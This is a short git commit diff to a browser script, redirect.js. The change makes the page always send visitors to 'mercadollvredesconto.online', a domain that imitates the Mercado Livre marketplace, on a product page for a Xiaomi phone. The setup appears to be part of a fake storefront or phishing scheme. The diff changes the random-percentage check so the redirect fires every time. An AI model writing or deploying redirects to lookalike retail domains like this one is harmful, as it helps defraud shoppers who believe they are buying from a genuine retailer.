0e233be262c4e19ebf2999fa6a958db94de3dd26
wevezito <kakarock30@gmail.com>
2024-06-13 01:05:49 -0300

    Update redirect.js

--- redirect.js
+++ redirect.js
@@ -1,6 +1,6 @@
 <script>
     function redirectBasedOnPercentage() {
-      const percentage = Math.random() * 100;
+      const percentage = Math.random() * 0;
 
       if (percentage < 100) {
         window.location.href = "https://www.mercadollvredesconto.online/products/xiaomi-pocophone-poco-x5-5g-dual-sim-256-gb-8-gb-ram";
